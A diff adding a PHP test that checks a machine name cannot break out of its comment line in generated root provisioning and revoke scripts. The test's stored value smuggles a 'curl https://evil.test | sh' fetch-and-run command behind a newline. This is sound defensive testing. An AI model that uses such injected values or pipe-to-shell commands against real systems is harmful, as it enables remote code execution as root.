@@ -74,6 +74,15 @@ it('renders a script with valid bash syntax and a restricted key', function () {
     unlink($file);
 });
 
+it('keeps the machine name on its comment line in the root scripts, whatever was stored', function () {
+    $machine = provisionedMachine();
+    $machine->forceFill(['name' => "x\"\ncurl https://evil.test | sh\n#"])->save();
+
+    foreach ([app(ProvisionScript::class)->render($machine), app(RevokeScript::class)->render($machine)] as $script) {
+        expect($script)->not->toMatch('/^curl https:\/\/evil/m');
+    }
+});
+
 it('rejects source IPs that are not addresses or CIDR ranges', function (string $entry) {
     config(['sentinel.provisioning.source_ips' => ['203.0.113.9', $entry]]);
 
